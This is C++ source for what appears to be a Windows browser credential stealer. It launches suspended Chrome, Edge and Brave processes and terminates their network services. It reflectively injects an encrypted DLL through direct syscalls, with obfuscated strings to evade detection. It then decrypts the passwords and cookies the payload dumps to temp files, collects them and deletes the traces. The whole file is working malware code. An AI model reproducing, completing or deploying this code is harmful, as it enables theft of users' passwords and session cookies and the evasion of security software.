#include "Fokos.h"

#include <Windows.h>
#include <Rpc.h>
#include <iostream>
#include <string>
#include <vector>
#include "Encrypt.h"
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <optional>
#include <map>
#include <memory>
#include <stdexcept>
#include "nlohmann/json.hpp"
#include <fstream>   // for std::ifstream
#include <vector>    // for std::vector
#include <cstdint>
#include <algorithm>
#include "BRSHt/syscalls.h"


#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "user32.lib")

using json = nlohmann::json;


#ifndef IMAGE_FILE_MACHINE_AMD64
#define IMAGE_FILE_MACHINE_AMD64 0x8664
#endif
#ifndef IMAGE_FILE_MACHINE_ARM64
#define IMAGE_FILE_MACHINE_ARM64 0xAA64
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace
{
    constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;

    const uint8_t g_decryptionKey[32] = {
        0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
        0x58, 0x4A, 0x7D, 0x67, 0x8C, 0x79, 0x77, 0x46,
        0xBE, 0x6B, 0x4E, 0x0C, 0x54, 0x57, 0xCD, 0x95,
        0x18, 0xDE, 0x7E, 0x21, 0x47, 0x66, 0x7C, 0x94 };

    const uint8_t g_decryptionNonce[12] = {
        0x4A, 0x51, 0x78, 0x62, 0x8D, 0x2D, 0x4A, 0x54,
        0x88, 0xE5, 0x3C, 0x50 };

    namespace fs = std::filesystem;

    struct HandleDeleter
    {
        void operator()(HANDLE h) const
        {
            if (h && h != INVALID_HANDLE_VALUE)
                CloseHandle(h);
        }
    };
    using UniqueHandle = std::unique_ptr<void, HandleDeleter>;

    namespace Utils
    {
        std::string WStringToUtf8(std::wstring_view w_sv)
        {
            if (w_sv.empty())
                return {};
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
            std::string utf8_str(size_needed, '\0');
            WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr);
            return utf8_str;
        }

        std::string PtrToHexStr(const void* ptr)
        {
            std::ostringstream oss;
            oss << EC("0x") << std::hex << reinterpret_cast<uintptr_t>(ptr);
            return oss.str();
        }

        std::string NtStatusToString(NTSTATUS status)
        {
            std::ostringstream oss;
            oss << EC("0x") << std::hex << status;
            return oss.str();
        }

        std::wstring GenerateUniquePipeName()
        {
            UUID uuid;
            UuidCreate(&uuid);
            wchar_t* uuidStrRaw = nullptr;
            UuidToStringW(&uuid, (RPC_WSTR*)&uuidStrRaw);
            std::wstring pipeName = EC(L"\\\\.\\pipe\\") + std::wstring(uuidStrRaw);
            RpcStringFreeW((RPC_WSTR*)&uuidStrRaw);
            return pipeName;
        }
    }
}
std::string Nemmmmy;

void DecryptString(std::string& data, BYTE key)
{
    for (size_t i = 0; i < data.size(); i++)
        data[i] ^= key;
}
// Load and decrypt data from file
bool LoadDecryptedFromFile(std::string& outData, const std::string& filePath, BYTE key)
{
    std::ifstream in(filePath, std::ios::binary);
    if (!in)
        return false;

    std::string encrypted((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    DecryptString(encrypted, key);
    outData = std::move(encrypted);
    return true;
}

class Console
{
public:
    explicit Console(bool verbose) : m_verbose(verbose), m_hConsole(GetStdHandle(STD_OUTPUT_HANDLE))
    {
        CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
        GetConsoleScreenBufferInfo(m_hConsole, &consoleInfo);
        m_originalAttributes = consoleInfo.wAttributes;
    }

    void displayBanner() const
    {

    }

    void printUsage() const
    {

    }

    void Info(const std::string& msg) const { print(EC("[*]"), msg, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void Success(const std::string& msg) const { print(EC("[+]"), msg, FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void Error(const std::string& msg) const { print(EC("[-]"), msg, FOREGROUND_RED | FOREGROUND_INTENSITY); }
    void Warn(const std::string& msg) const { print(EC("[!]"), msg, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void Debug(const std::string& msg) const
    {
            print(EC("[#]"), msg, FOREGROUND_RED | FOREGROUND_GREEN);
    }

    void Relay(const std::string& message) const
    {
        size_t tagStart = message.find('[');
        size_t tagEnd = message.find(']', tagStart);
        if (tagStart != std::string::npos && tagEnd != std::string::npos)
        {
            std::cout << message.substr(0, tagStart);
            std::string tag = message.substr(tagStart, tagEnd - tagStart + 1);
            WORD color = m_originalAttributes;
            if (tag == EC("[+]"))
                color = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            else if (tag == EC("[-]"))
                color = FOREGROUND_RED | FOREGROUND_INTENSITY;
            else if (tag == EC("[*]"))
                color = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            else if (tag == EC("[!]"))
                color = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            SetColor(color);
            std::cout << tag;
            ResetColor();
            std::cout << message.substr(tagEnd + 1) << std::endl;
        }
        else
        {
            std::cout << message << std::endl;
        }
    }

private:
    void print(const std::string& tag, const std::string& msg, WORD color) const
    {
        SetColor(color);
        std::cout << tag;
        ResetColor();
        std::cout << " " << msg << std::endl;
    }
    void SetColor(WORD attributes) const { SetConsoleTextAttribute(m_hConsole, attributes); }
    void ResetColor() const { SetConsoleTextAttribute(m_hConsole, m_originalAttributes); }

    bool m_verbose;
    HANDLE m_hConsole;
    WORD m_originalAttributes;
};

struct Configuration
{
    bool verbose = false;
    fs::path outputPath;
    std::wstring browserType;
    std::wstring browserProcessName;
    std::wstring browserDefaultExePath;
    std::string browserDisplayName;

    // Original function
    [[nodiscard]] static std::optional<Configuration> CreateFromArgs(int argc, wchar_t* argv[], const Console& console)
    {
        Configuration config;
        fs::path customOutputPath;

        for (int i = 1; i < argc; ++i)
        {
            std::wstring_view arg = argv[i];
            if (arg == EC(L"--verbose") || arg == EC(L"-v"))
                config.verbose = true;
            else if ((arg == EC(L"--output-path") || arg == EC(L"-o")) && i + 1 < argc)
                customOutputPath = argv[++i];
            else if (arg == EC(L"--help") || arg == EC(L"-h"))
            {
                console.printUsage();
                return std::nullopt;
            }
            else if (config.browserType.empty() && !arg.empty() && arg[0] != L'-')
                config.browserType = arg;
            else
            {
                console.Warn(EC("Unknown or misplaced argument: ") + Utils::WStringToUtf8(arg));
                return std::nullopt;
            }
        }

        if (config.browserType.empty())
        {
            console.printUsage();
            return std::nullopt;
        }
        std::transform(config.browserType.begin(), config.browserType.end(), config.browserType.begin(), ::towlower);

        static const std::map<std::wstring, std::pair<std::wstring, std::wstring>> browserMap = {
            {EC(L"chrome"), {EC(L"chrome.exe"), EC(L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")}},
            {EC(L"brave"), {EC(L"brave.exe"), EC(L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe")}},
            {EC(L"edge"), {EC(L"msedge.exe"), EC(L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe")}} };

        auto it = browserMap.find(config.browserType);
        if (it == browserMap.end())
        {
            console.Error(EC("Unsupported browser type: ") + Utils::WStringToUtf8(config.browserType));
            return std::nullopt;
        }

        config.browserProcessName = it->second.first;
        config.browserDefaultExePath = it->second.second;

        std::string displayName = Utils::WStringToUtf8(config.browserType);
        if (!displayName.empty())
            displayName[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(displayName[0])));
        config.browserDisplayName = displayName;

        config.outputPath = customOutputPath.empty() ? fs::current_path() / EC("output") : fs::absolute(customOutputPath);

        return config;
    }

    // New overload for simple browser string
    [[nodiscard]] static std::optional<Configuration> CreateFromArgs(const std::wstring& browser)
    {
        Configuration config;
        std::wstring browserType = browser;
        std::transform(browserType.begin(), browserType.end(), browserType.begin(), ::towlower);

        static const std::map<std::wstring, std::pair<std::wstring, std::wstring>> browserMap = {
            {EC(L"chrome"), {EC(L"chrome.exe"), EC(L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")}},
            {EC(L"brave"), {EC(L"brave.exe"), EC(L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe")}},
            {EC(L"edge"), {EC(L"msedge.exe"), EC(L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe")}} };

        auto it = browserMap.find(browserType);
        if (it == browserMap.end())
        {
            return std::nullopt;
        }

        config.browserType = browserType;
        config.browserProcessName = it->second.first;
        config.browserDefaultExePath = it->second.second;

        std::string displayName = Utils::WStringToUtf8(config.browserType);
        if (!displayName.empty())
            displayName[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(displayName[0])));
        config.browserDisplayName = displayName;

        config.outputPath = fs::current_path() / EC("output"); // default output path
        return config;
    }
};

class TargetProcess
{
public:
    TargetProcess(const Configuration& config, const Console& console) : m_config(config), m_console(console) {}

    void createSuspended()
    {
        m_console.Info(EC("Creating suspended ") + m_config.browserDisplayName + EC(" process."));
        m_console.Debug(EC("Target executable path: ") + Utils::WStringToUtf8(m_config.browserDefaultExePath));

        STARTUPINFOW si{};
        PROCESS_INFORMATION pi{};
        si.cb = sizeof(si);

        if (!CreateProcessW(
            m_config.browserDefaultExePath.c_str(), nullptr,
            nullptr, nullptr, FALSE, CREATE_SUSPENDED,
            nullptr, nullptr, &si, &pi))
        {

        }

        m_hProcess.reset(pi.hProcess);
        m_hThread.reset(pi.hThread);
        m_pid = pi.dwProcessId;

        m_console.Success(EC("Created suspended process PID: ") + std::to_string(m_pid));
        checkArchitecture();
    }

    void terminate()
    {
        if (m_hProcess)
        {
            m_console.Debug(EC("Terminating browser PID=") + std::to_string(m_pid) + EC(" via direct syscall."));
            NtTerminateProcess_syscall(m_hProcess.get(), 0);
            m_console.Info(m_config.browserDisplayName + EC(" terminated by injector."));
        }
    }

    HANDLE getProcessHandle() const { return m_hProcess.get(); }
    USHORT getArch() const { return m_arch; }

private:
    void checkArchitecture()
    {
        m_arch = IMAGE_FILE_MACHINE_AMD64;

        m_console.Debug(EC("Architecture match: Injector=, Target=") + std::string(getArchName(m_arch)));
    }

    const char* getArchName(USHORT arch) const
    {
        switch (arch)
        {
        case IMAGE_FILE_MACHINE_AMD64:
            return EC("x64");
        case IMAGE_FILE_MACHINE_ARM64:
            return EC("ARM64");
        case IMAGE_FILE_MACHINE_I386:
            return EC("x86");
        default:
            return EC("Unknown");
        }
    }

    const Configuration& m_config;
    const Console& m_console;
    DWORD m_pid = 0;
    UniqueHandle m_hProcess;
    UniqueHandle m_hThread;
    USHORT m_arch = 0;
};

std::string GetTempPathStr()
{
    char buf[MAX_PATH];
    DWORD len = GetTempPathA(MAX_PATH, buf);
    return std::string(buf, len);
}

class PipeCommunicator
{
public:
    PipeCommunicator(const std::wstring& pipeName, const Console& console) : m_pipeName(pipeName), m_console(console) {}

    void create()
    {
        m_pipeHandle.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1, 4096, 4096, 0, nullptr));
        if (!m_pipeHandle)
        {

        }
        m_console.Debug(EC("Named pipe server created: ") + Utils::WStringToUtf8(m_pipeName));
    }

    void waitForClient()
    {
        m_console.Debug(EC("Waiting for payload to connect to named pipe."));

        BOOL connected = ConnectNamedPipe(m_pipeHandle.get(), nullptr);
        if (!connected)
        {
            DWORD err = GetLastError();
            if (err == ERROR_PIPE_CONNECTED)
            {
                // The client connected before ConnectNamedPipe was called
                m_console.Debug(EC("Payload already connected to named pipe (ERROR_PIPE_CONNECTED)."));
            }
            else
            {
                // Something went wrong
                std::ostringstream oss;
                oss << "Failed to connect to named pipe. Error code: " << err;
                m_console.Debug(oss.str().c_str());
                return; // optionally bail out
            }
        }

        m_console.Debug(EC("Payload connected to named pipe."));
    }

    void sendInitialData(bool isVerbose, const fs::path& outputPath)
    {
        writeMessage(isVerbose ? EC("VERBOSE_TRUE") : EC("VERBOSE_FALSE"));
        writeMessage(outputPath.string());
    }

    void relayMessages()
    {
        m_console.Info(EC("Waiting for payload execution. (Pipe: ") + Utils::WStringToUtf8(m_pipeName) + EC(")"));
        std::cout << std::endl;

        const std::string dllCompletionSignal = EC("__DLL_PIPE_COMPLETION_SIGNAL__");
        DWORD startTime = GetTickCount();
        std::string accumulatedData;
        char buffer[4096];
        bool completed = false;

        while (!completed && (GetTickCount() - startTime < DLL_COMPLETION_TIMEOUT_MS))
        {
            DWORD bytesAvailable = 0;
            if (!PeekNamedPipe(m_pipeHandle.get(), nullptr, 0, nullptr, &bytesAvailable, nullptr))
            {
                if (GetLastError() == ERROR_BROKEN_PIPE)
                    break;
                m_console.Error(EC("PeekNamedPipe failed. Error: ") + std::to_string(GetLastError()));
                break;
            }
            if (bytesAvailable == 0)
            {
                Sleep(100);
                continue;
            }

            DWORD bytesRead = 0;
            if (!ReadFile(m_pipeHandle.get(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr) || bytesRead == 0)
            {
                if (GetLastError() == ERROR_BROKEN_PIPE)
                    break;
                continue;
            }

            accumulatedData.append(buffer, bytesRead);

            size_t messageStart = 0;
            size_t nullPos;
            while ((nullPos = accumulatedData.find('\0', messageStart)) != std::string::npos)
            {
                std::string message = accumulatedData.substr(messageStart, nullPos - messageStart);
                messageStart = nullPos + 1;

                if (message == dllCompletionSignal)
                {
                    m_console.Debug(EC("Payload completion signal received."));
                    completed = true;
                    break;
                }
                if (!message.empty())
                {
                    if (Nemmmmy.empty())
                    {
                        if (message.find(EC("NUMMORO")) != std::string::npos)
                        {
                            Nemmmmy = message.substr(message.size() - 4);
                        }
                        else
                        {
                            m_console.Relay(message);
                        }
                    }
                    else
                    {
                        m_console.Relay(message);
                    }

                }
            }
            if (completed)
                break;
            accumulatedData.erase(0, messageStart);
        }
        std::cout << std::endl;
        m_console.Success(EC("Payload signaled completion or pipe interaction ended."));
    }

    const std::wstring& getName() const { return m_pipeName; }

private:
    void writeMessage(const std::string& msg)
    {
        DWORD bytesWritten = 0;
        if (!WriteFile(m_pipeHandle.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &bytesWritten, nullptr) ||
            bytesWritten != (msg.length() + 1))
        {
        }
        m_console.Debug(EC("Sent message to pipe: ") + msg);
    }

    std::wstring m_pipeName;
    const Console& m_console;
    UniqueHandle m_pipeHandle;
};

class InjectionManager
{
public:
    InjectionManager(TargetProcess& target, const Console& console)
        : m_target(target), m_console(console) {
    }

    void execute(const std::wstring& pipeName, std::vector<BYTE> exxx)
    {
        m_decryptedDllPayload = std::move(exxx);


        m_console.Debug(EC("Parsing payload PE headers for ReflectiveLoader."));
        DWORD rdiOffset = getReflectiveLoaderOffset();
      
        m_console.Debug(EC("ReflectiveLoader found at file offset: ") + Utils::PtrToHexStr((void*)(uintptr_t)rdiOffset));

        m_console.Debug(EC("Allocating memory for payload in target process."));
        PVOID remoteDllBase = nullptr;
        SIZE_T payloadDllSize = m_decryptedDllPayload.size();
        SIZE_T pipeNameByteSize = (pipeName.length() + 1) * sizeof(wchar_t);
        SIZE_T totalAllocationSize = payloadDllSize + pipeNameByteSize;

        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, 0, &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
       
        m_console.Debug(EC("Combined memory for payload and parameters allocated at: ") + Utils::PtrToHexStr(remoteDllBase));

        m_console.Debug(EC("Writing payload DLL to target process."));
        SIZE_T bytesWritten = 0;
        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteDllBase, m_decryptedDllPayload.data(), payloadDllSize, &bytesWritten);
       
        m_console.Debug(EC("Writing pipe name parameter into the same allocation."));
        LPVOID remotePipeNameAddr = reinterpret_cast<PBYTE>(remoteDllBase) + payloadDllSize;
        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr, (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
     
        m_console.Debug(EC("Changing payload memory protection to executable."));
        ULONG oldProtect = 0;
        status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);


        startHijackedThreadInTarget(remoteDllBase, rdiOffset, remotePipeNameAddr);

        m_console.Success(EC("New thread created for payload. Main thread remains suspended."));
    }

private:

    DWORD getReflectiveLoaderOffset()
    {
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_decryptedDllPayload.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
            return 0;

        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((uintptr_t)m_decryptedDllPayload.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
            return 0;

        auto exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRva == 0)
            return 0;

        auto RvaToOffset = [&](DWORD rva) -> PVOID
            {
                PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
                for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section)
                {
                    if (rva >= section->VirtualAddress && rva < section->VirtualAddress + section->Misc.VirtualSize)
                    {
                        return (PVOID)((uintptr_t)m_decryptedDllPayload.data() + section->PointerToRawData + (rva - section->VirtualAddress));
                    }
                }
                return nullptr;
            };

        auto exportDir = (PIMAGE_EXPORT_DIRECTORY)RvaToOffset(exportDirRva);
        if (!exportDir)
            return 0;

        auto names = (PDWORD)RvaToOffset(exportDir->AddressOfNames);
        auto ordinals = (PWORD)RvaToOffset(exportDir->AddressOfNameOrdinals);
        auto funcs = (PDWORD)RvaToOffset(exportDir->AddressOfFunctions);
        if (!names || !ordinals || !funcs)
            return 0;

        for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
        {
            char* funcName = (char*)RvaToOffset(names[i]);
            if (funcName && strcmp(funcName, EC("ReflectiveLoader")) == 0)
            {
                PVOID funcOffsetPtr = RvaToOffset(funcs[ordinals[i]]);
                if (!funcOffsetPtr)
                    return 0;
                return (DWORD)((uintptr_t)funcOffsetPtr - (uintptr_t)m_decryptedDllPayload.data());
            }
        }
        return 0;
    }

    void startHijackedThreadInTarget(PVOID remoteDllBase, DWORD rdiOffset, PVOID remotePipeNameAddr)
    {
        m_console.Debug(EC("Creating new thread in target to execute ReflectiveLoader."));

        uintptr_t entryPoint = reinterpret_cast<uintptr_t>(remoteDllBase) + rdiOffset;
        HANDLE hRemoteThread = nullptr;

        NTSTATUS status = NtCreateThreadEx_syscall(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, m_target.getProcessHandle(),
            (LPTHREAD_START_ROUTINE)entryPoint, remotePipeNameAddr, 0, 0, 0, 0, nullptr);

        UniqueHandle remoteThreadGuard(hRemoteThread);

        if (!NT_SUCCESS(status))
        {
        }

        m_console.Debug(EC("Successfully created new thread for payload."));
    }

    TargetProcess& m_target;
    const Console& m_console;

    std::vector<BYTE> m_decryptedDllPayload;


};

void KillBrowserNetworkService(const Configuration& config, const Console& console)
{
    console.Info(EC("Scanning for and terminating browser network services..."));

    UniqueHandle hCurrentProc;
    HANDLE nextProcHandle = nullptr;
    int processes_terminated = 0;

    while (NT_SUCCESS(NtGetNextProcess_syscall(hCurrentProc.get(), PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, 0, 0, &nextProcHandle)))
    {
        UniqueHandle hNextProc(nextProcHandle);
        hCurrentProc = std::move(hNextProc);

        std::vector<BYTE> buffer(sizeof(UNICODE_STRING_SYSCALLS) + MAX_PATH * 2);
        auto imageName = reinterpret_cast<PUNICODE_STRING_SYSCALLS>(buffer.data());
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessImageFileName, imageName, (ULONG)buffer.size(), NULL)) || imageName->Length == 0)
            continue;

        fs::path p(std::wstring(imageName->Buffer, imageName->Length / sizeof(wchar_t)));
        if (_wcsicmp(p.filename().c_str(), config.browserProcessName.c_str()) != 0)
            continue;

        PROCESS_BASIC_INFORMATION pbi{};
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr)) || !pbi.PebBaseAddress)
            continue;

        PEB peb{};
        if (!NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), pbi.PebBaseAddress, &peb, sizeof(peb), nullptr)))
            continue;
        RTL_USER_PROCESS_PARAMETERS params{};
        if (!NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), peb.ProcessParameters, &params, sizeof(params), nullptr)))
            continue;

        std::vector<wchar_t> cmdLine(params.CommandLine.Length / sizeof(wchar_t) + 1, 0);
        if (params.CommandLine.Length > 0 && !NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), params.CommandLine.Buffer, cmdLine.data(), params.CommandLine.Length, nullptr)))
            continue;

        if (wcsstr(cmdLine.data(), EC(L"--utility-sub-type=network.mojom.NetworkService")))
        {
            console.Success(EC("Found and terminated network service PID: ") + std::to_string((DWORD)pbi.UniqueProcessId));
            NtTerminateProcess_syscall(hCurrentProc.get(), 0);
            processes_terminated++;
        }
    }

    if (processes_terminated > 0)
    {
        console.Info(EC("Termination sweep complete. Waiting for file locks to fully release."));
        Sleep(1500);
    }
}

void RunInjectionWorkflow(const Configuration& config, const Console& console, std::vector<BYTE> borr)
{
    KillBrowserNetworkService(config, console);

    TargetProcess target(config, console);
    target.createSuspended();

    PipeCommunicator pipe(Utils::GenerateUniquePipeName(), console);
    pipe.create();

    InjectionManager injector(target, console);
    injector.execute(pipe.getName(), borr);

    pipe.waitForClient();
    pipe.sendInitialData(config.verbose, config.outputPath);
    pipe.relayMessages();

    target.terminate();
}


std::string toString(const json& j) {
    if (j.is_string()) return j.get<std::string>();
    if (j.is_number()) return std::to_string(j.get<double>());
    if (j.is_boolean()) return j.get<bool>() ? EC("true") : EC("false");
    if (j.is_null()) return EC("");
    return ""; // fallback, or handle arrays/objects separately
}


void PassProcess(const std::string& path, std::vector<std::vector<std::string>>& Passeyy, std::string Nummy) {
    if (fs::exists(path)) {
        std::string decrypted;
        if (LoadDecryptedFromFile(decrypted, path, 0xAA)) {
            try {
                json j = json::parse(decrypted);

                std::cout << EC("\n=== Decrypted from: ") << path << EC(" ===\n");

                for (auto& item : j) {
                    if (item.contains(EC("origin")) && item.contains(EC("username")) && item.contains(EC("password"))) {
                        try {

                            // Credentials format
                            /*std::cout << EC("Origin: ") << item[EC("origin")] << EC("\n");
                            std::cout << EC("Username: ") << item[EC("username")] << EC("\n");
                            std::cout << EC("Password: ") << item[EC("password")] << EC("\n");
                            std::cout << EC("---------------------\n");*/

                            Passeyy.push_back({ toString(item[EC("origin")]), toString(item[EC("username")]), toString(item[EC("password")]), Nummy });
                        }
                        catch (std::exception& e) {
                            std::cerr << EC("JSON parse error BUT INSIDEE: ") << e.what() << EC("\n");
                            continue;
                        }
                    
                    }
                    else {
                        std::cout << item.dump(4) << EC("\n");
                    }
                }

            }
            catch (std::exception& e) {
                std::cerr << EC("JSON parse error in ") << path << EC(": ") << e.what() << EC("\n");
            }
        }
        else {
            std::cout << EC("Failed to decrypt: ") << path << EC("\n");
        }

        // Delete file after processing
        std::error_code ec;
        fs::remove(path, ec);
        if (ec) {
            std::cerr << EC("Failed to delete: ") << path << EC(" (") << ec.message() << EC(")\n");
        }
    }
}



void CookieProcess(const std::string& path, std::vector<std::vector<std::string>>& Cookies, std::string Nummy) {
    if (fs::exists(path)) {
        std::string decrypted;

        std::cout << EC("Ck 1") << std::endl;

        if (LoadDecryptedFromFile(decrypted, path, 0xAA)) {
            try {

				std::cout << EC("Ck 2") << std::endl;
                json j = json::parse(decrypted);

                std::cout << EC("\n=== Decrypted from: ") << path << EC(" ===\n");

                for (auto& item : j) {
                    if (item.contains(EC("host")) && item.contains(EC("name")) && item.contains(EC("value"))) {

                        try
                        {
                            // Cookie format
                            /*std::cout << EC("Host: ") << item[EC("host")] << EC("\n");
                            std::cout << EC("Name: ") << item[EC("name")] << EC("\n");
                            std::cout << EC("Value: ") << item[EC("value")] << EC("\n");
                            std::cout << EC("Path: ") << item[EC("path")] << EC("\n");
                            std::cout << EC("Secure: ") << item[EC("secure")] << EC("\n");
                            std::cout << EC("HttpOnly: ") << item[EC("httpOnly")] << EC("\n");
                            std::cout << EC("Expires: ") << item[EC("expires")] << EC("\n");
                            std::cout << EC("---------------------\n");*/

                            Cookies.push_back({ toString(item[EC("name")]), toString(item[EC("value")]), toString(item[EC("host")]), toString(item[EC("path")]), toString(item[EC("expires")]), Nummy });
                        }
                        catch (std::exception& e) {
                            std::cerr << EC("JSON parse error BUT INSIDEE: ") << e.what() << EC("\n");
                            continue;
                        }
                    
                    }
                    else {
                        std::cout << item.dump(4) << EC("\n");
                    }
                }

            }
            catch (std::exception& e) {
                std::cerr << EC("JSON parse error in ") << path << EC(": ") << e.what() << EC("\n");
            }
        }
        else {
            std::cout << EC("Failed to decrypt: ") << path << EC("\n");
        }

        // Delete file after processing
        std::error_code ec;
        fs::remove(path, ec);
        if (ec) {
            std::cerr << EC("Failed to delete: ") << path << EC(" (") << ec.message() << EC(")\n");
        }
    }
}


bool IsBrowserInstalled(const std::wstring& regSubKey, const std::wstring& valueName)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regSubKey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS &&
        RegOpenKeyExW(HKEY_CURRENT_USER, regSubKey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
    {
        return false;
    }

    wchar_t path[MAX_PATH];
    DWORD pathSize = sizeof(path);
    LONG result = RegQueryValueExW(hKey, valueName.c_str(), nullptr, nullptr, reinterpret_cast<LPBYTE>(path), &pathSize);
    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS && wcslen(path) > 0);
}

bool HasChrome()
{
    return IsBrowserInstalled(EC(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"), EC(L""));
}

bool HasBrave()
{
    return IsBrowserInstalled(EC(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe"), EC(L""));
}



// Function definition
void Moain(std::vector<BYTE> bayyat, std::vector<std::vector<std::string>>& Cookies, std::vector<std::vector<std::string>>& Passeyy) {
    Console console(false);


    if (!InitializeSyscalls(false))
    {
        console.Error(EC("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked or gadgets not found."));
    }

    std::string Temppp = GetTempPathStr();

    std::string ChromeCookiePath = Temppp + EC("chc11");
    std::string ChromePassPath = Temppp + EC("cps11");

    std::string EdgeCookiePath = Temppp + EC("eck11");
    std::string EdgePassPath = Temppp + EC("eps11");

    std::string BraveCookiePath = Temppp + EC("bccb11");
    std::string BravePassPath = Temppp + EC("bppb11");

    std::vector<std::vector<std::string>> CookiesTepo;
    std::vector<std::vector<std::string>> PasswordsTepo;

    if (HasChrome())
    {
        printf(EC("In Chrome"));
        auto optConfig = Configuration::CreateFromArgs(EC(L"chrome"));
        try
        {
            RunInjectionWorkflow(*optConfig, console, bayyat);
        }
        catch (const std::runtime_error& e)
        {
            console.Error(e.what());
        }

        Sleep(250);

        CookieProcess(ChromeCookiePath, CookiesTepo, EC("1"));
        PassProcess(ChromePassPath, PasswordsTepo, EC("1"));
        Cookies = CookiesTepo;
        Passeyy = PasswordsTepo;
    }

    printf(EC("In Edge"));
    auto optConfig2 = Configuration::CreateFromArgs(EC(L"edge"));
    try
    {
        RunInjectionWorkflow(*optConfig2, console, bayyat);
    }
    catch (const std::runtime_error& e)
    {
        console.Error(e.what());
    }

    Sleep(250);

    //CookieProcess(EdgeCookiePath, CookiesTepo, EC("2"));
    if (fs::exists(EdgeCookiePath)) {
        std::error_code eced;
        fs::remove(EdgeCookiePath, eced);
        if (eced) {
            std::cerr << EC("Failed to delete: ") << EdgeCookiePath << EC(" (") << eced.message() << EC(")\n");
        }
    }
    PassProcess(EdgePassPath, PasswordsTepo, EC("2"));
    Cookies = CookiesTepo;
    Passeyy = PasswordsTepo;


    if (HasBrave())
    {
        printf(EC("In Brave"));

        auto optConfig3 = Configuration::CreateFromArgs(EC(L"brave"));
        try
        {
            RunInjectionWorkflow(*optConfig3, console, bayyat);
        }
        catch (const std::runtime_error& e)
        {
            std::cout << EC("Error during injection: ") << e.what() << EC("\n");
        }

        Sleep(250);

        //CookieProcess(BraveCookiePath, CookiesTepo, EC("3"));
        if (fs::exists(BraveCookiePath)) {
            std::error_code eceb;
            fs::remove(BraveCookiePath, eceb);
            if (eceb) {
                std::cerr << EC("Failed to delete: ") << BraveCookiePath << EC(" (") << eceb.message() << EC(")\n");
            }
        }
        PassProcess(BravePassPath, PasswordsTepo, EC("3"));
        Cookies = CookiesTepo;
        Passeyy = PasswordsTepo;
    }
   

	CookiesTepo.clear();
	PasswordsTepo.clear();

    printf(EC("Injector finished successfully."));
}
